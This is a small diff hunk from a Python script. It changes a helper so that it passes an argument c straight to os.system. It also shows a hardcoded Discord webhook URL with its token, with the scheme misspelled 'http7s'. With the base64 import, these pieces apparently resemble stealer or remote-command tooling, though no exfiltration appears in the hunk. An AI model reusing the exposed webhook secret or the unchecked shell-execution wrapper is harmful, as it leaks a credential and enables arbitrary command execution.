@@ -4,7 +4,7 @@ import json
 from base64 import *
 
 webhookk = "http7s://discord.com/api/webhooks/1218950019575709707/-Nuf4XgGEUUt780Gm6CzA4iiXno293x3UKWgzaX8pDB4ua4pry9nAvoaPvbBwmpDMmkO"
-def command():
+def command(c):
     os.system(c)
 def cls():
     os.system("cls")
